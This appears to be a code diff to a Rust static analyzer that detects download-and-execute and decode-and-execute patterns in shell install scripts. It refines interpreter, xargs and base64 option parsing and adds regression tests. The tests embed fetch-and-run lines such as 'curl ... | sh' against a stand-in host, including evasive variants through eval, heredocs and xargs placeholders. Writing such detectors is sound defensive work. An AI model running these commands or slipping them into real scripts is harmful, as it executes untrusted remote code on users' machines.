@@ -2869,13 +2869,14 @@ fn command_is_interpreter(command: &ScriptCommand) -> bool {
 
 /// What an interpreter invocation executes: stdin as a script, a statically
 /// known body (`-c` text), a file or module operand, a parse-only read
-/// (`bash -n` checks without executing), or nothing at all (help/version
-/// exits before reading stdin).
+/// (`bash -n` checks without executing — the carried body, when the command
+/// has one, is what gets parsed instead of stdin), or nothing at all
+/// (help/version exits before reading stdin).
 enum InterpreterMode<'a> {
     StdinScript,
     LiteralBody(&'a str),
     FileOrModule,
-    ParseOnly,
+    ParseOnly { body: Option<&'a str> },
     Exits,
 }
 
@@ -2915,35 +2916,49 @@ fn interpreter_mode<'a>(command: &ScriptCommand<'a>) -> InterpreterMode<'a> {
             // The FIRST operand after `--` selects the script (`-` is
             // stdin); later words are positional parameters, not the script
             // (`sh -- - arg` still reads stdin).
-            let operand_mode = match command.args[index + 1..]
+            let operand = command.args[index + 1..]
                 .iter()
                 .find(|operand| !operand.is_empty())
-            {
-                None | Some(&"-") => InterpreterMode::StdinScript,
-                Some(_) => InterpreterMode::FileOrModule,
-            };
+                .copied();
+            // With `-c` pending (its capture deferred to a valued cluster
+            // letter), the first operand after `--` is the body.
+            if shell_command_body.is_none() && shell_command_requested {
+                shell_command_body = operand;
+            }
             return if shell_noexec {
-                InterpreterMode::ParseOnly
+                InterpreterMode::ParseOnly {
+                    body: shell_command_body,
+                }
             } else if let Some(body) = shell_command_body {
                 InterpreterMode::LiteralBody(body)
             } else if shell_stdin {
                 InterpreterMode::StdinScript
             } else {
-                operand_mode
+                match operand {
+                    None | Some("-") => InterpreterMode::StdinScript,
+                    Some(_) => InterpreterMode::FileOrModule,
+                }
             };
         }
         if *arg == "-" {
+            // Conventional stdin operand — unless a pending `-c` takes it as
+            // the deferred body (`bash -co errexit -`).
+            let body = shell_command_body.or_else(|| shell_command_requested.then_some(*arg));
             return if shell_noexec {
-                InterpreterMode::ParseOnly
-            } else if let Some(body) = shell_command_body {
+                InterpreterMode::ParseOnly { body }
+            } else if let Some(body) = body {
                 InterpreterMode::LiteralBody(body)
             } else {
                 InterpreterMode::StdinScript
-            }; // conventional stdin operand
+            };
         }
         if let Some(long) = arg.strip_prefix("--") {
             match interpreter_long_option(shell_family, long) {
                 LongOption::Exits => return InterpreterMode::Exits,
+                LongOption::NoExec => {
+                    shell_noexec = true;
+                    index += 1;
+                }
                 LongOption::Flag => index += 1,
                 LongOption::Value => {
                     // `--rcfile FILE` — the value is glued on `=` or separate.
@@ -2965,7 +2980,16 @@ fn interpreter_mode<'a>(command: &ScriptCommand<'a>) -> InterpreterMode<'a> {
                 match bytes[offset] {
                     b'c' => {
                         shell_command_requested = true;
-                        shell_command_body = separate_cluster_value(command, index);
+                        // `-c`'s body is the next argv word — but a later
+                        // letter of the same cluster may consume it as an
+                        // option value first (`-co errexit 'sh'` values
+                        // `errexit`, then takes `sh` as the body).
+                        let later_valued = bytes[offset + 1..]
+                            .iter()
+                            .any(|letter| matches!(letter, b'o' | b'O'));
+                        if !later_valued {
+                            shell_command_body = separate_cluster_value(command, index);
+                        }
                         // Remaining bytes are still options, not body text.
                         offset += 1;
                     }
@@ -3026,8 +3050,15 @@ fn interpreter_mode<'a>(command: &ScriptCommand<'a>) -> InterpreterMode<'a> {
             index += advance;
             continue;
         }
+        // First operand: with a pending `-c` whose capture a valued cluster
+        // letter deferred, the operand IS the body (`bash -co errexit 'sh'`).
+        if shell_command_body.is_none() && shell_command_requested {
+            shell_command_body = Some(*arg);
+        }
         return if shell_noexec {
-            InterpreterMode::ParseOnly
+            InterpreterMode::ParseOnly {
+                body: shell_command_body,
+            }
         } else if let Some(body) = shell_command_body {
             InterpreterMode::LiteralBody(body)
         } else if shell_stdin {
@@ -3037,7 +3068,9 @@ fn interpreter_mode<'a>(command: &ScriptCommand<'a>) -> InterpreterMode<'a> {
         }; // a script file operand
     }
     if shell_noexec {
-        InterpreterMode::ParseOnly
+        InterpreterMode::ParseOnly {
+            body: shell_command_body,
+        }
     } else if let Some(body) = shell_command_body {
         InterpreterMode::LiteralBody(body)
     } else if shell_stdin || (shell_family && !shell_command_requested) {
@@ -3064,6 +3097,9 @@ fn separate_cluster_value<'a>(command: &ScriptCommand<'a>, index: usize) -> Opti
 /// executed-stdin reading of the ones it accepts.
 enum LongOption {
     Exits,
+    /// Implies noexec (`--dump-strings`): input is read and parsed, never
+    /// executed — but unlike `--help` it still drains piped stdin.
+    NoExec,
     Flag,
     Value,
 }
@@ -3072,7 +3108,8 @@ fn interpreter_long_option(shell_family: bool, long: &str) -> LongOption {
     let name = long.split('=').next().unwrap_or(long);
     if shell_family {
         match name {
-            "help" | "version" | "dump-po-strings" | "dump-strings" => LongOption::Exits,
+            "help" | "version" => LongOption::Exits,
+            "dump-po-strings" | "dump-strings" => LongOption::NoExec,
             "rcfile" | "init-file" => LongOption::Value,
             _ => LongOption::Flag, // --norc, --noprofile, --posix, …
         }
@@ -3211,16 +3248,26 @@ fn stdin_code_consumer(command: &ScriptCommand) -> bool {
     false
 }
 
-/// `xargs` appends its input to the wrapped command's argv: when that
-/// command is an interpreter whose `-c` body is MISSING, the input word
-/// becomes the executed body (`curl URL | xargs sh -c`); a static body
-/// only evaluates the input when it references the positional parameters
-/// (`xargs sh -c 'eval "$@"' _`), while a fixed body (`echo safe`) runs
-/// the same script for every input word.
+/// `xargs` appends its input to the wrapped command's argv. The input
+/// reaches executed code when the wrapped shell invocation has no static
+/// place to put it: a `-c` mode without a body (the input becomes the
+/// body), a body that flows input through positional parameters or the
+/// `-I` replacement placeholder into command position, a stdin operand
+/// (`-`), or no operand at all (the input becomes the executed script
+/// file). A static script operand pins the executed file, so a later `-c`
+/// spelling is its argument, not a mode (`xargs sh local-script -c`).
 fn xargs_feeds_stdin_code(command: &ScriptCommand) -> bool {
     let Some(wrapped) = xargs_wrapped_command(command) else {
         return false;
     };
+    let placeholder = xargs_placeholder(command, wrapped);
+    if let Some(head) = command.args.get(wrapped)
+        && placeholder
+            .as_deref()
+            .is_some_and(|mark| head.contains(mark))
+    {
+        return true; // the input word IS the executed program
+    }
     let wrapped_command = ScriptCommand {
         head: command_basename(command.args[wrapped]),
         args: command.args[wrapped + 1..].to_vec(),
@@ -3229,21 +3276,118 @@ fn xargs_feeds_stdin_code(command: &ScriptCommand) -> bool {
     if interpreter_family(&wrapped_command) != Some(InterpreterFamily::Shell) {
         return false;
     }
-    let Some(c_option) = wrapped_command
-        .args
-        .iter()
-        .position(|arg| is_short_option(arg, 'c'))
-    else {
-        return false;
-    };
-    match wrapped_command.args.get(c_option + 1) {
-        // With no static body, xargs appends the input word at the missing
-        // command-string position.
-        None => true,
-        // `$@` is deliberately runtime-derived, but it is still static
-        // *syntax* we can follow as xargs taint through a shell body.
-        Some(body) => positional_parameters_reach_code(body),
+    let mut c_body: Option<&str> = None;
+    let mut c_requested = false;
+    let mut index = 0usize;
+    while let Some(arg) = wrapped_command.args.get(index) {
+        if *arg == "--" {
+            // The first operand after `--` is the executed script file.
+            return match wrapped_command.args.get(index + 1) {
+                None => true, // the input fills the script position
+                Some(operand) => operand_is_input_code(operand, placeholder.as_deref()),
+            };
+        }
+        if !arg.starts_with('-') {
+            if *arg == "-" {
+                return true; // stdin operand: the shell executes the pipe
+            }
+            // First non-option operand: the executed script file. With a
+            // pending `-c` whose body it is, the body decides instead.
+            if c_requested {
+                return match c_body {
+                    None => true,
+                    Some(body) => body_is_input_code(body, placeholder.as_deref()),
+                };
+            }
+            return operand_is_input_code(arg, placeholder.as_deref());
+        }
+        if is_short_option(arg, 'c') {
+            c_requested = true;
+            c_body = separate_cluster_value(&wrapped_command, index);
+        }
+        index += 1;
     }
+    if c_requested {
+        // Body-less `-c`: the input word becomes the command body.
+        return match c_body {
+            None => true,
+            Some(body) => body_is_input_code(body, placeholder.as_deref()),
+        };
+    }
+    // No `-c`, no operand: the input word becomes the executed script file.
+    true
+}
+
+/// The `-I`/`--replace` placeholder of this xargs invocation, when one is
+/// set before the wrapped command: xargs substitutes it with each input
+/// item wherever it appears in the initial arguments.
+fn xargs_placeholder(command: &ScriptCommand, wrapped: usize) -> Option<String> {
+    let mut index = 0usize;
+    while index < wrapped {
+        let arg = command.args[index];
+        if let Some(mark) = arg.strip_prefix("-I") {
+            return (!mark.is_empty())
+                .then_some(mark.to_owned())
+                .or_else(|| command.args.get(index + 1).map(|value| value.to_string()));
+        }
+        if let Some(rest) = arg.strip_prefix("--replace") {
+            if let Some(value) = rest.strip_prefix('=') {
+                return (!value.is_empty()).then_some(value.to_owned());
+            }
+            if rest.is_empty() {
+                return command.args.get(index + 1).map(|value| value.to_string());
+            }
+        }
+        index += 1;
+    }
+    None
+}
+
+/// Whether a static `-c` body executes xargs input: through positional
+/// parameters, or through the `-I` placeholder reaching a code position.
+fn body_is_input_code(body: &str, placeholder: Option<&str>) -> bool {
+    placeholder.is_some_and(|mark| placeholder_reaches_code(body, mark))
+        || positional_parameters_reach_code(body)
+}
+
+/// Whether a static operand executes xargs input: only when the `-I`
+/// placeholder spells it — a literal script file is repository content.
+fn operand_is_input_code(operand: &str, placeholder: Option<&str>) -> bool {
+    placeholder.is_some_and(|mark| operand.contains(mark))
+}
+
+/// Whether the `-I` placeholder reaches a code position inside a body: a
+/// command head, an `eval` argument, or an interpreter's script operand.
+/// Data positions (`echo {}`, `cp {} /tmp`) never execute it.
+fn placeholder_reaches_code(body: &str, placeholder: &str) -> bool {
+    let tokens = tokenize(body);
+    conditional_statements(&tokens)
+        .iter()
+        .any(|(statement, _)| {
+            pipeline_segments(statement).iter().any(|segment| {
+                let commands = segment_commands(segment);
+                let Some(command) = commands.first() else {
+                    return false;
+                };
+                // `command.head` is basename-normalized, which strips leading
+                // non-alphanumerics — a placeholder-only head (`{}`, `%x`) must
+                // be read from the raw command-position word.
+                let mut head_index = 0usize;
+                skip_command_prefixes(segment, &mut head_index);
+                let raw_head = segment
+                    .get(head_index)
+                    .and_then(ShellToken::word)
+                    .unwrap_or(command.head);
+                raw_head.contains(placeholder)
+                    || (command.head == "eval"
+                        && command.args.iter().any(|arg| arg.contains(placeholder)))
+                    || (command_is_interpreter(command)
+                        && command
+                            .args
+                            .first()
+                            .is_some_and(|arg| arg.contains(placeholder)))
+            })
+        })
 }
 
 /// Return the actual xargs child-command head after options. Interpreter
@@ -3395,11 +3539,41 @@ fn command_decodes(command: &ScriptCommand) -> bool {
 }
 
 /// Decoder mode shared by finding production and stdin forwarding. GNU
-/// base64/base32 accept `d` in a short-option cluster (`-di`) as well as
-/// `--decode`; encoding flags alone are derived output, never script text.
+/// base64/base32 decode with `-d`/`--decode`, and `-w` consumes the rest of
+/// its cluster (or the next argument) as the wrap width — so `-w0d` is a
+/// width whose `d` is value text, never a decode flag, while `-di` decodes.
 fn command_is_decode_mode(command: &ScriptCommand) -> bool {
-    matches!(command.head, "base64" | "base32")
-        && (short_cluster_flag(&command.args, 'd') || command.args.contains(&"--decode"))
+    if !matches!(command.head, "base64" | "base32") {
+        return false;
+    }
+    let mut index = 0usize;
+    while let Some(arg) = command.args.get(index) {
+        if *arg == "--decode" {
+            return true;
+        }
+        if let Some(flags) = arg
+            .strip_prefix('-')
+            .filter(|flags| !flags.starts_with('-'))
+        {
+            let mut decode = false;
+            for letter in flags.chars() {
+                match letter {
+                    'd' => decode = true,
+                    'w' => break, // everything glued after `-w` is the width
+                    _ => {}
+                }
+            }
+            if decode {
+                return true;
+            }
+            // A `-w` cluster with nothing glued takes the next argument.
+            if flags.ends_with('w') {
+                index += 1;
+            }
+        }
+        index += 1;
+    }
+    false
 }
 
 /// Whether any command in the segment's command positions — including inside
@@ -3654,10 +3828,18 @@ fn segment_stdin_behavior(segment: &[ShellToken], budget: &mut ShellBudget) -> S
     }
     if command_is_interpreter(command) {
         return match interpreter_mode(command) {
-            // Both shell parse-only modes and Python's stdin program consume
-            // the pipe, but only shell stdin mode is an H3 code sink.
-            InterpreterMode::ParseOnly | InterpreterMode::StdinScript => StdinBehavior::Consumes,
-            InterpreterMode::FileOrModule
+            // A stdin-script interpreter consumes the pipe; so does a
+            // parse-only interpreter WITHOUT a body (`bash -n`,
+            // `--dump-strings` read and parse stdin, executing nothing).
+            // With a `-c` body, the body is what gets parsed and the pipe
+            // stays available for what runs next
+            // (`bash -n -c 'echo safe'; sh`). Only stdin-script mode is an
+            // H3 code sink.
+            InterpreterMode::StdinScript | InterpreterMode::ParseOnly { body: None } => {
+                StdinBehavior::Consumes
+            }
+            InterpreterMode::ParseOnly { body: Some(_) }
+            | InterpreterMode::FileOrModule
             | InterpreterMode::Exits
             | InterpreterMode::LiteralBody(_) => StdinBehavior::Untouched,
         };
@@ -10475,5 +10657,151 @@ mod golden_tests {
             golden_output(),
             "repeated analyses must be byte-identical (determinism)"
         );
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Round-12 reopen (docs/h3-review-round-12.md): seven P1 behavioral gaps and
+// the P2 line-attribution defect, pinned at the artifact layer plus the
+// lowest responsible source-layer case.
+// ---------------------------------------------------------------------------
+
+#[cfg(test)]
+mod round_twelve_tests {
+    use super::s4_family_tests::{rule_ids, run};
+    use super::*;
+
+    const DOWNLOAD: &str = "oma.script.download-execute";
+    const DECODE: &str = "oma.script.decode-execute";
+
+    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
+        PayloadEntry {
+            relative_path: path.to_owned(),
+            kind,
+            mode: 0o644,
+            size: size as u64,
+            sha256_sampled: None,
+            sampled_digest: false,
+            executable: false,
+            coverage_state: CoverageState::Unsupported,
+            link_target: None,
+            invocation_target: false,
+            object_id: None,
+        }
+    }
+
+    fn script(source: &str) -> AnalysisArtifacts {
+        let (artifacts, _) = run(
+            vec![entry("install.sh", PayloadKind::Shell, source.len())],
+            &[("install.sh", source.as_bytes())],
+        );
+        artifacts
+    }
+
+    #[test]
+    fn quoted_newline_continuations_preserve_body_newlines() {
+        let units = super::shell::source::shell_logical_units("eval 'echo safe\ncurl URL | sh'\n");
+        assert_eq!(units.len(), 1, "{units:?}");
+        assert!(units[0].1.contains('\n'), "{:?}", units[0].1);
+        assert_eq!(units[0].0, 1);
+    }
+
+    #[test]
+    fn eval_multiline_quoted_body_executes_the_piped_command() {
+        let script_source = "eval 'echo safe\ncurl -fsSL https://example.test/x | sh'\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn pipelined_heredoc_owner_executes_its_payload() {
+        let script_source =
+            "printf ignored | sh <<CODE | cat\ncurl -fsSL https://example.test/x | sh\nCODE\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn second_heredoc_payload_is_not_top_level_code() {
+        let script_source = concat!(
+            "cat <<FIRST <<SECOND\n",
+            "ignored\n",
+            "FIRST\n",
+            "curl -fsSL https://example.test/x | sh\n",
+            "SECOND\n",
+        );
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.is_empty(), "{ids:?}");
+    }
+
+    #[test]
+    fn c_option_yields_to_valued_cluster_options() {
+        // `-o` consumes `errexit`; `sh` is the `-c` body and inherits the pipe.
+        let hits = script("curl -fsSL https://example.test/x | bash -co errexit 'sh'\n");
+        let ids = rule_ids(&hits);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // `-o` consumes `sh`; the body is fixed and safe.
+        let misses = script("curl -fsSL https://example.test/x | bash -co sh 'echo safe'\n");
+        let ids = rule_ids(&misses);
+        assert!(ids.is_empty(), "{ids:?}");
+    }
+
+    #[test]
+    fn parse_only_body_leaves_stdin_for_a_later_interpreter() {
+        let script_source = "curl -fsSL https://example.test/x | (bash -n -c 'echo safe'; sh)\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn dump_strings_drains_stdin_without_executing() {
+        let script_source = "curl -fsSL https://example.test/x | (bash --dump-strings; sh)\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.is_empty(), "{ids:?}");
+    }
+
+    #[test]
+    fn xargs_script_operand_shields_a_later_c_flag() {
+        let script_source = "curl -fsSL https://example.test/x | xargs sh local-script -c\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.is_empty(), "{ids:?}");
+    }
+
+    #[test]
+    fn xargs_replacement_placeholder_reaching_code_fires() {
+        // The placeholder becomes the `-c` body itself.
+        let body = script("curl -fsSL https://example.test/x | xargs -I{} sh -c '{}'\n");
+        let ids = rule_ids(&body);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // The placeholder becomes the executed script file.
+        let file = script("curl -fsSL https://example.test/x | xargs -I{} sh '{}'\n");
+        let ids = rule_ids(&file);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn xargs_replacement_placeholder_as_data_stays_silent() {
+        let script_source =
+            "curl -fsSL https://example.test/x | xargs -I{} cp {} /tmp/destination\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(ids.is_empty(), "{ids:?}");
+    }
+
+    #[test]
+    fn decoder_wrap_value_shields_cluster_letters() {
+        let script_source = "curl -fsSL https://example.test/x | base64 -w0d | sh\n";
+        let ids = rule_ids(&script(script_source));
+        assert!(
+            !ids.contains(&DOWNLOAD.to_owned()) && !ids.contains(&DECODE.to_owned()),
+            "{ids:?}"
+        );
+    }
+
+    #[test]
+    fn heredoc_removal_preserves_finding_line_numbers() {
+        let script_source = "cat <<CODE\ndata\nCODE\ncurl -fsSL https://example.test/x | sh\n";
+        let findings = script(script_source).rendered_findings();
+        let lines: Vec<Option<u32>> = findings.iter().map(|finding| finding.line).collect();
+        assert_eq!(lines, vec![Some(4)], "{lines:?}");
     }
 }
